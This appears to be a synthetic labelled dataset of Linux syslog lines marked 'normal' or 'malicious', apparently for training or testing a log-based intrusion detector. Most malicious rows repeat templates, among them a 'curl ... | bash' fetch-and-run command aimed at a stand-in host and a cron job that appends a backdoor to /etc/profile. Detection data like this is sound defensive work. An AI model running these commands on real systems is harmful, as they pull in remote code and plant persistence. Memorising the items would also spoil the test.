id,log_text,label
4064,bash[2253]: curl http://malicious.example/payload.sh | bash,malicious
4065,kernel: [ 8308.22 ] USB device plugged,normal
4066,sshd[7916]: Accepted publickey for user from 192.168.229.12 port 22 ssh2,normal
4067,networkd: DHCPv4 address assigned to eth0,normal
4068,systemd[1]: Started Session 6292 of user root.,normal
4069,bash[8845]: curl http://malicious.example/payload.sh | bash,malicious
4070,networkd: DHCPv4 address assigned to eth0,normal
4071,systemd[1]: Created malicious service persistence_7429.service,malicious
4072,systemd[1]: Started Session 8066 of user root.,normal
4073,kernel: [ 2202.64 ] Module loaded: suspicious_mod,malicious
4074,networkd: DHCPv4 address assigned to eth0,normal
4075,sshd[9713]: Accepted publickey for user from 192.168.208.143 port 22 ssh2,normal
4076,systemd[1]: Started Session 8750 of user root.,normal
4077,networkd: DHCPv4 address assigned to eth0,normal
4078,bash[1271]: curl http://malicious.example/payload.sh | bash,malicious
4079,CRON[9363]: (root) CMD (whoami),normal
4080,kernel: [ 620.5 ] USB device plugged,normal
4081,kernel: [ 8340.98 ] Module loaded: suspicious_mod,malicious
4082,CRON[8859]: (root) CMD (uptime),normal
4083,CRON[4398]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4084,bash[1879]: curl http://malicious.example/payload.sh | bash,malicious
4085,systemd[1]: Started Session 7928 of user root.,normal
4086,kernel: [ 332.16 ] Module loaded: suspicious_mod,malicious
4087,bash[3542]: curl http://malicious.example/payload.sh | bash,malicious
4088,systemd[1]: Started Session 6289 of user root.,normal
4089,CRON[4901]: (root) CMD (whoami),normal
4090,networkd: DHCPv4 address assigned to eth0,normal
4091,kernel: [ 9688.39 ] Module loaded: suspicious_mod,malicious
4092,CRON[4221]: (root) CMD (uptime),normal
4093,networkd: DHCPv4 address assigned to eth0,normal
4094,bash[3445]: curl http://malicious.example/payload.sh | bash,malicious
4095,systemd[1]: Created malicious service persistence_4380.service,malicious
4096,kernel: [ 2868.5 ] USB device plugged,normal
4097,sshd[8413]: Accepted publickey for user from 192.168.38.191 port 22 ssh2,normal
4098,CRON[5653]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4099,kernel: [ 873.55 ] USB device plugged,normal
4100,systemd[1]: Started Session 5314 of user root.,normal
4101,CRON[8723]: (root) CMD (ls),normal
4102,systemd[1]: Created malicious service persistence_5692.service,malicious
4103,CRON[5069]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4104,networkd: DHCPv4 address assigned to eth0,normal
4105,networkd: DHCPv4 address assigned to eth0,normal
4106,kernel: [ 3745.02 ] USB device plugged,normal
4107,sshd[7362]: Accepted publickey for user from 192.168.131.142 port 22 ssh2,normal
4108,bash[8491]: curl http://malicious.example/payload.sh | bash,malicious
4109,systemd[1]: Started Session 8075 of user root.,normal
4110,sshd[6440]: Failed password for invalid user admin from 5.188.199.226 port 22 ssh2,malicious
4111,systemd[1]: Started Session 8503 of user root.,normal
4112,sshd[6794]: Accepted publickey for user from 192.168.125.42 port 22 ssh2,normal
4113,networkd: DHCPv4 address assigned to eth0,normal
4114,CRON[6970]: (root) CMD (pwd),normal
4115,sshd[6425]: Accepted publickey for user from 192.168.218.48 port 22 ssh2,normal
4116,sshd[2978]: Accepted publickey for user from 192.168.63.38 port 22 ssh2,normal
4117,kernel: [ 6881.72 ] USB device plugged,normal
4118,sshd[1560]: Failed password for invalid user admin from 5.188.154.110 port 22 ssh2,malicious
4119,kernel: [ 3913.69 ] Module loaded: suspicious_mod,malicious
4120,systemd[1]: Created malicious service persistence_6656.service,malicious
4121,kernel: [ 7836.47 ] Module loaded: suspicious_mod,malicious
4122,CRON[9977]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4123,sshd[3212]: Accepted publickey for user from 192.168.87.176 port 22 ssh2,normal
4124,kernel: [ 8551.55 ] Module loaded: suspicious_mod,malicious
4125,kernel: [ 7795.02 ] USB device plugged,normal
4126,kernel: [ 2242.17 ] Module loaded: suspicious_mod,malicious
4127,systemd[1]: Started Session 2063 of user root.,normal
4128,systemd[1]: Created malicious service persistence_1362.service,malicious
4129,sshd[9663]: Accepted publickey for user from 192.168.136.143 port 22 ssh2,normal
4130,systemd[1]: Created malicious service persistence_1404.service,malicious
4131,networkd: DHCPv4 address assigned to eth0,normal
4132,networkd: DHCPv4 address assigned to eth0,normal
4133,systemd[1]: Created malicious service persistence_3140.service,malicious
4134,sshd[8999]: Accepted publickey for user from 192.168.253.137 port 22 ssh2,normal
4135,networkd: DHCPv4 address assigned to eth0,normal
4136,kernel: [ 1968.8 ] Module loaded: suspicious_mod,malicious
4137,networkd: DHCPv4 address assigned to eth0,normal
4138,CRON[7757]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4139,bash[4741]: curl http://malicious.example/payload.sh | bash,malicious
4140,bash[2730]: curl http://malicious.example/payload.sh | bash,malicious
4141,sshd[2855]: Failed password for invalid user admin from 5.188.93.23 port 22 ssh2,malicious
4142,CRON[3423]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4143,kernel: [ 632.86 ] USB device plugged,normal
4144,CRON[8373]: (root) CMD (whoami),normal
4145,systemd[1]: Created malicious service persistence_7311.service,malicious
4146,systemd[1]: Started Session 2050 of user root.,normal
4147,CRON[3942]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4148,networkd: DHCPv4 address assigned to eth0,normal
4149,kernel: [ 7315.36 ] USB device plugged,normal
4150,sshd[2400]: Accepted publickey for user from 192.168.234.24 port 22 ssh2,normal
4151,bash[8135]: curl http://malicious.example/payload.sh | bash,malicious
4152,bash[8866]: curl http://malicious.example/payload.sh | bash,malicious
4153,sshd[2185]: Accepted publickey for user from 192.168.149.37 port 22 ssh2,normal
4154,kernel: [ 3643.49 ] Module loaded: suspicious_mod,malicious
4155,sshd[2931]: Accepted publickey for user from 192.168.143.98 port 22 ssh2,normal
4156,CRON[3309]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4157,CRON[6824]: (root) CMD (uptime),normal
4158,CRON[7427]: (root) CMD (whoami),normal
4159,systemd[1]: Started Session 9729 of user root.,normal
4160,systemd[1]: Created malicious service persistence_2387.service,malicious
4161,CRON[5084]: (root) CMD (uptime),normal
4162,CRON[4420]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4163,kernel: [ 9187.75 ] USB device plugged,normal
4164,sshd[3684]: Accepted publickey for user from 192.168.64.250 port 22 ssh2,normal
4165,sshd[3792]: Failed password for invalid user admin from 5.188.152.211 port 22 ssh2,malicious
4166,networkd: DHCPv4 address assigned to eth0,normal
4167,kernel: [ 6003.9 ] USB device plugged,normal
4168,sshd[4435]: Accepted publickey for user from 192.168.4.70 port 22 ssh2,normal
4169,sshd[9572]: Accepted publickey for user from 192.168.58.114 port 22 ssh2,normal
4170,kernel: [ 6458.37 ] Module loaded: suspicious_mod,malicious
4171,networkd: DHCPv4 address assigned to eth0,normal
4172,CRON[8492]: (root) CMD (pwd),normal
4173,systemd[1]: Created malicious service persistence_3492.service,malicious
4174,systemd[1]: Started Session 6166 of user root.,normal
4175,kernel: [ 3939.77 ] USB device plugged,normal
4176,networkd: DHCPv4 address assigned to eth0,normal
4177,bash[1877]: curl http://malicious.example/payload.sh | bash,malicious
4178,kernel: [ 6181.31 ] USB device plugged,normal
4179,sshd[5864]: Accepted publickey for user from 192.168.48.122 port 22 ssh2,normal
4180,CRON[5143]: (root) CMD (whoami),normal
4181,bash[3802]: curl http://malicious.example/payload.sh | bash,malicious
4182,CRON[2488]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4183,sshd[7441]: Accepted publickey for user from 192.168.56.14 port 22 ssh2,normal
4184,networkd: DHCPv4 address assigned to eth0,normal
4185,kernel: [ 3554.57 ] USB device plugged,normal
4186,kernel: [ 1694.27 ] USB device plugged,normal
4187,systemd[1]: Created malicious service persistence_4837.service,malicious
4188,bash[6705]: curl http://malicious.example/payload.sh | bash,malicious
4189,sshd[1577]: Accepted publickey for user from 192.168.63.7 port 22 ssh2,normal
4190,systemd[1]: Started Session 4154 of user root.,normal
4191,CRON[1206]: (root) CMD (whoami),normal
4192,kernel: [ 6584.61 ] USB device plugged,normal
4193,CRON[7139]: (root) CMD (ls),normal
4194,systemd[1]: Started Session 6185 of user root.,normal
4195,systemd[1]: Started Session 5530 of user root.,normal
4196,CRON[5923]: (root) CMD (ls),normal
4197,sshd[1752]: Accepted publickey for user from 192.168.29.182 port 22 ssh2,normal
4198,CRON[6233]: (root) CMD (uptime),normal
4199,networkd: DHCPv4 address assigned to eth0,normal
4200,CRON[2838]: (root) CMD (ls),normal
4201,sshd[3735]: Failed password for invalid user admin from 5.188.73.31 port 22 ssh2,malicious
4202,networkd: DHCPv4 address assigned to eth0,normal
4203,kernel: [ 6816.04 ] USB device plugged,normal
4204,systemd[1]: Started Session 8153 of user root.,normal
4205,CRON[4589]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4206,kernel: [ 2713.44 ] USB device plugged,normal
4207,systemd[1]: Started Session 1064 of user root.,normal
4208,sshd[8941]: Accepted publickey for user from 192.168.100.15 port 22 ssh2,normal
4209,sshd[7989]: Failed password for invalid user admin from 5.188.22.127 port 22 ssh2,malicious
4210,sshd[3957]: Failed password for invalid user admin from 5.188.102.192 port 22 ssh2,malicious
4211,bash[4689]: curl http://malicious.example/payload.sh | bash,malicious
4212,sshd[3375]: Failed password for invalid user admin from 5.188.67.136 port 22 ssh2,malicious
4213,CRON[2134]: (root) CMD (pwd),normal
4214,CRON[7862]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4215,systemd[1]: Started Session 1427 of user root.,normal
4216,networkd: DHCPv4 address assigned to eth0,normal
4217,CRON[7671]: (root) CMD (pwd),normal
4218,kernel: [ 6445.27 ] Module loaded: suspicious_mod,malicious
4219,sshd[3970]: Accepted publickey for user from 192.168.221.179 port 22 ssh2,normal
4220,sshd[5881]: Failed password for invalid user admin from 5.188.63.223 port 22 ssh2,malicious
4221,sshd[6462]: Accepted publickey for user from 192.168.108.68 port 22 ssh2,normal
4222,CRON[9381]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4223,sshd[9651]: Failed password for invalid user admin from 5.188.234.29 port 22 ssh2,malicious
4224,bash[1146]: curl http://malicious.example/payload.sh | bash,malicious
4225,sshd[8342]: Accepted publickey for user from 192.168.77.36 port 22 ssh2,normal
4226,bash[7783]: curl http://malicious.example/payload.sh | bash,malicious
4227,sshd[2152]: Accepted publickey for user from 192.168.194.86 port 22 ssh2,normal
4228,bash[8806]: curl http://malicious.example/payload.sh | bash,malicious
4229,networkd: DHCPv4 address assigned to eth0,normal
4230,networkd: DHCPv4 address assigned to eth0,normal
4231,systemd[1]: Created malicious service persistence_4942.service,malicious
4232,systemd[1]: Created malicious service persistence_8434.service,malicious
4233,kernel: [ 5005.78 ] Module loaded: suspicious_mod,malicious
4234,sshd[5334]: Accepted publickey for user from 192.168.114.45 port 22 ssh2,normal
4235,kernel: [ 1760.98 ] USB device plugged,normal
4236,systemd[1]: Created malicious service persistence_7638.service,malicious
4237,kernel: [ 7603.09 ] USB device plugged,normal
4238,sshd[8052]: Failed password for invalid user admin from 5.188.174.163 port 22 ssh2,malicious
4239,CRON[3648]: (root) CMD (uptime),normal
4240,kernel: [ 6980.77 ] Module loaded: suspicious_mod,malicious
4241,kernel: [ 2675.61 ] Module loaded: suspicious_mod,malicious
4242,sshd[5099]: Failed password for invalid user admin from 5.188.73.132 port 22 ssh2,malicious
4243,sshd[2561]: Failed password for invalid user admin from 5.188.14.180 port 22 ssh2,malicious
4244,kernel: [ 3938.74 ] Module loaded: suspicious_mod,malicious
4245,systemd[1]: Started Session 3095 of user root.,normal
4246,kernel: [ 6737.18 ] USB device plugged,normal
4247,bash[9541]: curl http://malicious.example/payload.sh | bash,malicious
4248,kernel: [ 9059.35 ] USB device plugged,normal
4249,CRON[5000]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4250,sshd[1159]: Failed password for invalid user admin from 5.188.172.48 port 22 ssh2,malicious
4251,sshd[5844]: Accepted publickey for user from 192.168.153.106 port 22 ssh2,normal
4252,kernel: [ 1296.05 ] USB device plugged,normal
4253,kernel: [ 9592.7 ] USB device plugged,normal
4254,kernel: [ 1255.56 ] USB device plugged,normal
4255,networkd: DHCPv4 address assigned to eth0,normal
4256,CRON[6393]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4257,sshd[3728]: Accepted publickey for user from 192.168.246.209 port 22 ssh2,normal
4258,systemd[1]: Created malicious service persistence_9489.service,malicious
4259,bash[3622]: curl http://malicious.example/payload.sh | bash,malicious
4260,sshd[2958]: Accepted publickey for user from 192.168.39.30 port 22 ssh2,normal
4261,kernel: [ 6663.96 ] Module loaded: suspicious_mod,malicious
4262,sshd[7967]: Accepted publickey for user from 192.168.14.145 port 22 ssh2,normal
4263,CRON[2937]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4264,bash[6114]: curl http://malicious.example/payload.sh | bash,malicious
4265,sshd[4907]: Failed password for invalid user admin from 5.188.203.223 port 22 ssh2,malicious
4266,networkd: DHCPv4 address assigned to eth0,normal
4267,bash[8453]: curl http://malicious.example/payload.sh | bash,malicious
4268,sshd[9628]: Failed password for invalid user admin from 5.188.254.55 port 22 ssh2,malicious
4269,networkd: DHCPv4 address assigned to eth0,normal
4270,CRON[8615]: (root) CMD (pwd),normal
4271,systemd[1]: Created malicious service persistence_5183.service,malicious
4272,kernel: [ 2847.48 ] Module loaded: suspicious_mod,malicious
4273,CRON[7902]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4274,systemd[1]: Created malicious service persistence_6744.service,malicious
4275,bash[7800]: curl http://malicious.example/payload.sh | bash,malicious
4276,systemd[1]: Created malicious service persistence_5513.service,malicious
4277,systemd[1]: Created malicious service persistence_8278.service,malicious
4278,CRON[2229]: (root) CMD (uptime),normal
4279,CRON[7486]: (root) CMD (whoami),normal
4280,kernel: [ 6670.96 ] USB device plugged,normal
4281,kernel: [ 9830.35 ] USB device plugged,normal
4282,systemd[1]: Created malicious service persistence_8194.service,malicious
4283,kernel: [ 8763.28 ] Module loaded: suspicious_mod,malicious
4284,bash[4723]: curl http://malicious.example/payload.sh | bash,malicious
4285,systemd[1]: Created malicious service persistence_8279.service,malicious
4286,kernel: [ 4488.06 ] Module loaded: suspicious_mod,malicious
4287,networkd: DHCPv4 address assigned to eth0,normal
4288,bash[7812]: curl http://malicious.example/payload.sh | bash,malicious
4289,systemd[1]: Started Session 4191 of user root.,normal
4290,CRON[5423]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4291,sshd[5705]: Accepted publickey for user from 192.168.44.109 port 22 ssh2,normal
4292,kernel: [ 6946.13 ] USB device plugged,normal
4293,systemd[1]: Created malicious service persistence_2480.service,malicious
4294,CRON[2508]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4295,kernel: [ 1511.16 ] USB device plugged,normal
4296,kernel: [ 767.25 ] Module loaded: suspicious_mod,malicious
4297,bash[5549]: curl http://malicious.example/payload.sh | bash,malicious
4298,bash[1688]: curl http://malicious.example/payload.sh | bash,malicious
4299,sshd[9864]: Accepted publickey for user from 192.168.59.142 port 22 ssh2,normal
4300,systemd[1]: Started Session 4907 of user root.,normal
4301,kernel: [ 6637.21 ] Module loaded: suspicious_mod,malicious
4302,systemd[1]: Started Session 7121 of user root.,normal
4303,systemd[1]: Started Session 6143 of user root.,normal
4304,systemd[1]: Created malicious service persistence_9676.service,malicious
4305,sshd[2694]: Failed password for invalid user admin from 5.188.108.158 port 22 ssh2,malicious
4306,sshd[4847]: Accepted publickey for user from 192.168.2.91 port 22 ssh2,normal
4307,CRON[2922]: (root) CMD (ls),normal
4308,bash[4687]: curl http://malicious.example/payload.sh | bash,malicious
4309,CRON[8810]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4310,kernel: [ 8246.08 ] USB device plugged,normal
4311,sshd[9546]: Accepted publickey for user from 192.168.161.147 port 22 ssh2,normal
4312,CRON[2361]: (root) CMD (uptime),normal
4313,networkd: DHCPv4 address assigned to eth0,normal
4314,CRON[6053]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4315,networkd: DHCPv4 address assigned to eth0,normal
4316,networkd: DHCPv4 address assigned to eth0,normal
4317,networkd: DHCPv4 address assigned to eth0,normal
4318,CRON[6423]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4319,systemd[1]: Created malicious service persistence_8306.service,malicious
4320,kernel: [ 3458.5 ] USB device plugged,normal
4321,kernel: [ 6003.62 ] USB device plugged,normal
4322,systemd[1]: Created malicious service persistence_6238.service,malicious
4323,CRON[4303]: (root) CMD (uptime),normal
4324,networkd: DHCPv4 address assigned to eth0,normal
4325,networkd: DHCPv4 address assigned to eth0,normal
4326,kernel: [ 6819.92 ] Module loaded: suspicious_mod,malicious
4327,systemd[1]: Created malicious service persistence_6860.service,malicious
4328,systemd[1]: Started Session 9570 of user root.,normal
4329,CRON[5150]: (root) CMD (uptime),normal
4330,kernel: [ 7836.79 ] Module loaded: suspicious_mod,malicious
4331,bash[5099]: curl http://malicious.example/payload.sh | bash,malicious
4332,CRON[4137]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4333,systemd[1]: Created malicious service persistence_3737.service,malicious
4334,systemd[1]: Started Session 5720 of user root.,normal
4335,systemd[1]: Created malicious service persistence_8927.service,malicious
4336,CRON[7812]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4337,sshd[2027]: Accepted publickey for user from 192.168.116.115 port 22 ssh2,normal
4338,CRON[2137]: (root) CMD (whoami),normal
4339,kernel: [ 1350.45 ] USB device plugged,normal
4340,CRON[9932]: (root) CMD (pwd),normal
4341,networkd: DHCPv4 address assigned to eth0,normal
4342,CRON[1256]: (root) CMD (whoami),normal
4343,kernel: [ 2547.82 ] Module loaded: suspicious_mod,malicious
4344,sshd[9331]: Failed password for invalid user admin from 5.188.158.221 port 22 ssh2,malicious
4345,systemd[1]: Started Session 9643 of user root.,normal
4346,sshd[5246]: Failed password for invalid user admin from 5.188.155.135 port 22 ssh2,malicious
4347,sshd[9044]: Failed password for invalid user admin from 5.188.121.141 port 22 ssh2,malicious
4348,CRON[7903]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4349,CRON[5201]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4350,kernel: [ 7495.46 ] USB device plugged,normal
4351,CRON[8402]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4352,systemd[1]: Started Session 7840 of user root.,normal
4353,bash[4499]: curl http://malicious.example/payload.sh | bash,malicious
4354,systemd[1]: Started Session 3096 of user root.,normal
4355,systemd[1]: Created malicious service persistence_5772.service,malicious
4356,CRON[1210]: (root) CMD (pwd),normal
4357,kernel: [ 7627.57 ] Module loaded: suspicious_mod,malicious
4358,CRON[8236]: (root) CMD (pwd),normal
4359,sshd[2033]: Accepted publickey for user from 192.168.38.188 port 22 ssh2,normal
4360,sshd[6815]: Accepted publickey for user from 192.168.90.251 port 22 ssh2,normal
4361,CRON[2020]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4362,sshd[9069]: Accepted publickey for user from 192.168.15.66 port 22 ssh2,normal
4363,kernel: [ 2853.14 ] USB device plugged,normal
4364,CRON[8099]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4365,kernel: [ 4855.73 ] USB device plugged,normal
4366,systemd[1]: Started Session 5152 of user root.,normal
4367,sshd[7178]: Failed password for invalid user admin from 5.188.128.7 port 22 ssh2,malicious
4368,CRON[4468]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4369,CRON[1595]: (root) CMD (uptime),normal
4370,systemd[1]: Created malicious service persistence_9442.service,malicious
4371,networkd: DHCPv4 address assigned to eth0,normal
4372,kernel: [ 1535.64 ] Module loaded: suspicious_mod,malicious
4373,sshd[1527]: Failed password for invalid user admin from 5.188.148.189 port 22 ssh2,malicious
4374,bash[2622]: curl http://malicious.example/payload.sh | bash,malicious
4375,systemd[1]: Created malicious service persistence_7784.service,malicious
4376,networkd: DHCPv4 address assigned to eth0,normal
4377,systemd[1]: Started Session 4937 of user root.,normal
4378,bash[5990]: curl http://malicious.example/payload.sh | bash,malicious
4379,systemd[1]: Created malicious service persistence_9677.service,malicious
4380,systemd[1]: Started Session 4877 of user root.,normal
4381,CRON[3715]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4382,systemd[1]: Created malicious service persistence_2481.service,malicious
4383,systemd[1]: Created malicious service persistence_5405.service,malicious
4384,bash[3684]: curl http://malicious.example/payload.sh | bash,malicious
4385,CRON[5155]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4386,sshd[9538]: Accepted publickey for user from 192.168.236.112 port 22 ssh2,normal
4387,CRON[3132]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4388,bash[3160]: curl http://malicious.example/payload.sh | bash,malicious
4389,systemd[1]: Created malicious service persistence_8733.service,malicious
4390,kernel: [ 6179.57 ] USB device plugged,normal
4391,bash[5662]: curl http://malicious.example/payload.sh | bash,malicious
4392,CRON[7086]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4393,networkd: DHCPv4 address assigned to eth0,normal
4394,kernel: [ 4169.8 ] USB device plugged,normal
4395,CRON[8965]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4396,CRON[5915]: (root) CMD (uptime),normal
4397,kernel: [ 8345.21 ] Module loaded: suspicious_mod,malicious
4398,kernel: [ 775.99 ] USB device plugged,normal
4399,CRON[1694]: (root) CMD (ls),normal
4400,networkd: DHCPv4 address assigned to eth0,normal
4401,sshd[1269]: Accepted publickey for user from 192.168.251.53 port 22 ssh2,normal
4402,systemd[1]: Started Session 6656 of user root.,normal
4403,bash[2148]: curl http://malicious.example/payload.sh | bash,malicious
4404,CRON[3925]: (root) CMD (uptime),normal
4405,systemd[1]: Created malicious service persistence_2912.service,malicious
4406,sshd[9924]: Accepted publickey for user from 192.168.31.25 port 22 ssh2,normal
4407,kernel: [ 1708.09 ] USB device plugged,normal
4408,CRON[9783]: (root) CMD (ls),normal
4409,CRON[3423]: (root) CMD (ls),normal
4410,kernel: [ 4464.08 ] USB device plugged,normal
4411,systemd[1]: Created malicious service persistence_4959.service,malicious
4412,bash[4766]: curl http://malicious.example/payload.sh | bash,malicious
4413,kernel: [ 655.56 ] Module loaded: suspicious_mod,malicious
4414,bash[5091]: curl http://malicious.example/payload.sh | bash,malicious
4415,sshd[2458]: Accepted publickey for user from 192.168.184.153 port 22 ssh2,normal
4416,CRON[7283]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4417,CRON[5844]: (root) CMD (pwd),normal
4418,kernel: [ 6609.3 ] USB device plugged,normal
4419,sshd[1950]: Accepted publickey for user from 192.168.222.153 port 22 ssh2,normal
4420,CRON[5201]: (root) CMD (pwd),normal
4421,CRON[6254]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4422,bash[2773]: curl http://malicious.example/payload.sh | bash,malicious
4423,CRON[6215]: (root) CMD (uptime),normal
4424,sshd[2838]: Failed password for invalid user admin from 5.188.216.132 port 22 ssh2,malicious
4425,sshd[7375]: Failed password for invalid user admin from 5.188.2.100 port 22 ssh2,malicious
4426,sshd[7341]: Failed password for invalid user admin from 5.188.75.95 port 22 ssh2,malicious
4427,CRON[6473]: (root) CMD (uptime),normal
4428,CRON[1464]: (root) CMD (ls),normal
4429,networkd: DHCPv4 address assigned to eth0,normal
4430,kernel: [ 933.34 ] USB device plugged,normal
4431,sshd[3612]: Accepted publickey for user from 192.168.137.255 port 22 ssh2,normal
4432,systemd[1]: Started Session 3085 of user root.,normal
4433,kernel: [ 4235.24 ] USB device plugged,normal
4434,systemd[1]: Created malicious service persistence_8949.service,malicious
4435,sshd[5810]: Failed password for invalid user admin from 5.188.132.36 port 22 ssh2,malicious
4436,sshd[3974]: Accepted publickey for user from 192.168.119.208 port 22 ssh2,normal
4437,sshd[4359]: Failed password for invalid user admin from 5.188.118.191 port 22 ssh2,malicious
4438,sshd[2618]: Accepted publickey for user from 192.168.57.219 port 22 ssh2,normal
4439,bash[2485]: curl http://malicious.example/payload.sh | bash,malicious
4440,systemd[1]: Started Session 3253 of user root.,normal
4441,kernel: [ 3001.09 ] USB device plugged,normal
4442,CRON[8558]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4443,CRON[2569]: (root) CMD (whoami),normal
4444,CRON[8260]: (root) CMD (uptime),normal
4445,bash[1795]: curl http://malicious.example/payload.sh | bash,malicious
4446,kernel: [ 40.64 ] Module loaded: suspicious_mod,malicious
4447,CRON[2356]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4448,kernel: [ 5640.16 ] USB device plugged,normal
4449,networkd: DHCPv4 address assigned to eth0,normal
4450,CRON[3530]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4451,networkd: DHCPv4 address assigned to eth0,normal
4452,CRON[9279]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4453,sshd[5885]: Accepted publickey for user from 192.168.207.212 port 22 ssh2,normal
4454,kernel: [ 5102.53 ] Module loaded: suspicious_mod,malicious
4455,networkd: DHCPv4 address assigned to eth0,normal
4456,CRON[7438]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4457,kernel: [ 1034.49 ] Module loaded: suspicious_mod,malicious
4458,bash[7822]: curl http://malicious.example/payload.sh | bash,malicious
4459,networkd: DHCPv4 address assigned to eth0,normal
4460,kernel: [ 8500.19 ] Module loaded: suspicious_mod,malicious
4461,CRON[1092]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4462,bash[8515]: curl http://malicious.example/payload.sh | bash,malicious
4463,kernel: [ 3986.45 ] USB device plugged,normal
4464,kernel: [ 4014.24 ] USB device plugged,normal
4465,networkd: DHCPv4 address assigned to eth0,normal
4466,CRON[4689]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
4467,kernel: [ 9974.9 ] Module loaded: suspicious_mod,malicious
4468,sshd[7225]: Accepted publickey for user from 192.168.41.54 port 22 ssh2,normal
4469,sshd[7120]: Accepted publickey for user from 192.168.184.103 port 22 ssh2,normal
4470,networkd: DHCPv4 address assigned to eth0,normal
4471,kernel: [ 6462.44 ] USB device plugged,normal
4472,sshd[7009]: Failed password for invalid user admin from 5.188.15.244 port 22 ssh2,malicious
4473,bash[7760]: curl http://malicious.example/payload.sh | bash,malicious
4474,sshd[9936]: Failed password for invalid user admin from 5.188.108.216 port 22 ssh2,malicious
4475,CRON[3451]: (root) CMD (pwd),normal
4476,systemd[1]: Started Session 2433 of user root.,normal
4477,networkd: DHCPv4 address assigned to eth0,normal
4478,kernel: [ 8642.13 ] Module loaded: suspicious_mod,malicious
4479,CRON[9046]: (root) CMD (pwd),normal
4480,kernel: [ 9194.06 ] Module loaded: suspicious_mod,malicious
4481,sshd[6737]: Accepted publickey for user from 192.168.70.219 port 22 ssh2,normal
4482,networkd: DHCPv4 address assigned to eth0,normal
4483,kernel: [ 4950.04 ] Module loaded: suspicious_mod,malicious
